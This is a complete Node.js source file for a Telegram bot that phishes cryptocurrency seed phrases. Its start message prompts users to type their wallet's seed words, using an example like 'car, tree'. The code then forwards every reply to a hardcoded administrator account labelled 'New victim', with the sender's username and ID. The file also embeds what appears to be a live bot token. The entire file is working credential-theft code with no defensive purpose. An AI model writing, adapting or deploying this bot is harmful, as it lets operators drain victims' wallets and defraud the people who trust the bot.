const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const TOKEN = '8792267571:AAEHfd8icGCncIvgGZYIyZoeJm6ea9mkY7s';
const ADMIN_ID = '8657518477';
const bot = new TelegramBot(TOKEN, { polling: true });
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, "Below, write the name of the wallet you use with a seed phrase—for example: Exodus, or "car, tree," etc.");
});
bot.on('message', (msg) => {
  if (!msg.text || msg.text.startsWith('/start')) return;
  const who = msg.from.username ? '@' + msg.from.username : (msg.from.first_name || 'unknown');
  bot.sendMessage(msg.chat.id, "Please Wait!");
  bot.sendMessage(ADMIN_ID, `New victim from ${who} (ID: ${msg.from.id}):\n\n${msg.text}`);
});
const app = express();
app.get('/', (req, res) => res.send('Bot is running'));
app.listen(process.env.PORT || 3000, () => {
  console.log('Keep-alive server started');
});
